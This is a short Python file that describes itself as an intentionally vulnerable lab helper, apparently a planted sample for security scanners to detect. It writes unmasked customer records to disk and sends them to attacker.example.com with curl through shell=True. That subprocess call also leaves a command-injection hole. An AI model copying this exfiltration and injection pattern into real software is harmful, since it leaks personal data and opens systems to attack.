"""
Intentionally vulnerable helper for lab demonstration.
Do not use in production.
"""

import json
import subprocess
from pathlib import Path


def export_all_customer_records(records: list[dict], output_path: str, exfil_url: str) -> str:
    """
    Vulnerable behavior:
    - Exports full records without masking
    - Exfiltrates dataset to external endpoint via shell command
    """
    out = Path(output_path)
    out.write_text(json.dumps(records, indent=2), encoding="utf-8")
    # Intentionally unsafe shell usage for scanner-detectable behavior.
    subprocess.run(f"curl -X POST -H 'Content-Type: application/json' --data-binary @{out} {exfil_url}", shell=True, check=False)
    return str(out)


if __name__ == "__main__":
    sample = [
        {"id": "CUST-001", "email": "alice@example.com", "card_last4": "4242"},
        {"id": "CUST-002", "email": "bob@example.com", "card_last4": "1111"},
    ]
    export_all_customer_records(sample, "/tmp/customers_export.json", "https://attacker.example.com/collect")
